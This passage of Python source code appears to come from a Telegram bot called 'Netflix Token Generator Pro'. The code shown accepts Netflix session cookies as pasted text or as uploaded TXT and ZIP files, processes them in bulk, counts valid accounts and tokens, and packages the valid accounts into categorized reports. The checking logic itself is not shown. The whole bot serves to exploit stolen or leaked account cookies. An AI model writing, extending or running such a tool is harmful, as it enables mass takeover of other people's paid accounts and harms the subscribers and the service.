    await u.message.reply_text(f"📊 *Stats*\n• Checked: {stats['total_checked']}\n• Valid: {stats['total_valid']}\n• Tokens: {stats['total_tokens']}\n• Since: {stats['start_time']}", parse_mode="Markdown")

async def button_callback(update, context):
    q = update.callback_query; await q.answer(); d = q.data
    if d == "action_settings":
        kb = [[InlineKeyboardButton("🔑 Token Only", callback_data="mode_tokenonly"), InlineKeyboardButton("📊 Full Info", callback_data="mode_fullinfo")],
              [InlineKeyboardButton("🎯 Filter", callback_data="mode_filter")]]
        await q.message.reply_text("⚙️ Choose mode:", reply_markup=InlineKeyboardMarkup(kb))
    elif d == "mode_tokenonly": context.user_data["mode"]="tokenonly"; await q.message.reply_text("✅ Token Only. Send cookies.")
    elif d == "mode_fullinfo": context.user_data["mode"]="fullinfo"; await q.message.reply_text("✅ Full Info. Send cookies.")
    elif d in ("mode_filter","action_filter"): context.user_data["mode"]="filter"; await q.message.reply_text("🎯 Filter Mode. Send ZIP/TXT.")
    elif d == "action_stats": await stats_cmd(update, context)
    elif d in ("action_start","action_file","action_text"): await q.message.reply_text("📨 Send cookies now!")

async def handle_message(update, context):
    text = update.message.text or ""
    if "NetflixId" in text or "netflixid" in text.lower():
        await process_cookie_text(text, context.user_data.get("mode","fullinfo"), "Text Input", update, context)
    else: await update.message.reply_text("❓ Send cookie with <code>NetflixId=</code>", parse_mode="HTML")

async def handle_file(update, context):
    doc = update.message.document
    if not doc: return
    fn = (doc.file_name or "file").lower()
    mode = context.user_data.get("mode","fullinfo")
    if doc.file_size > 20*1024*1024: await update.message.reply_text("❌ Max 20MB."); return
    sm = await update.message.reply_text(f"📂 Processing <code>{doc.file_name}</code>...", parse_mode="HTML")
    f = await doc.get_file(); buf = io.BytesIO(); await f.download_to_memory(buf); buf.seek(0); raw = buf.read()
    texts = []
    if fn.endswith(".zip"):
        try:
            with zipfile.ZipFile(io.BytesIO(raw)) as zf:
                names = [n for n in zf.namelist() if n.endswith((".txt",".json"))]
                if not names: await sm.delete(); await update.message.reply_text("❌ No .txt/.json in ZIP."); return
                for name in names: texts.append((zf.read(name).decode("utf-8",errors="ignore"), f"ZIP: {name}"))
        except Exception as e: await sm.delete(); await update.message.reply_text(f"❌ ZIP error: {e}"); return
    else:
        try: texts.append((raw.decode("utf-8",errors="ignore"), f"File: {doc.file_name}"))
        except Exception as e: await sm.delete(); await update.message.reply_text(f"❌ Error: {e}"); return
    await sm.delete()
    if mode == "filter":
        batch, t0 = [], time.time()
        for content, src in texts: await process_cookie_text(content, mode, src, update, context, filter_batch=batch)
        if not batch: await update.message.reply_text("❌ No valid accounts."); return
        pm = await update.message.reply_text(f"🗂️ Building report... {len(batch)} accounts", parse_mode="HTML")
        loop = asyncio.get_event_loop()
        stxt, zb, ns, nc = await loop.run_in_executor(None, lambda: build_filter_report(batch, t0))
        await pm.delete()
        await update.message.reply_text(f"🏁 <b>Done</b> ✅ {len(batch)} accounts, {nc} categories", parse_mode="HTML")
        sb = io.BytesIO(stxt.encode()); sb.name = f"summary_{ns}.txt"
        await update.message.reply_document(document=sb, filename=f"summary_{ns}.txt")
        zbi = io.BytesIO(zb); zbi.name = f"categorized_{ns}.zip"
        await update.message.reply_document(document=zbi, filename=f"categorized_{ns}.zip")
    else:
        for content, src in texts: await process_cookie_text(content, mode, src, update, context)


def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("tokenonly", tokenonly_cmd))
    app.add_handler(CommandHandler("fullinfo", fullinfo_cmd))
    app.add_handler(CommandHandler("filter", filter_cmd))
    app.add_handler(CommandHandler("cancel", cancel_cmd))
    app.add_handler(CommandHandler("stats", stats_cmd))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("🤖 Netflix Token Generator Pro is running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
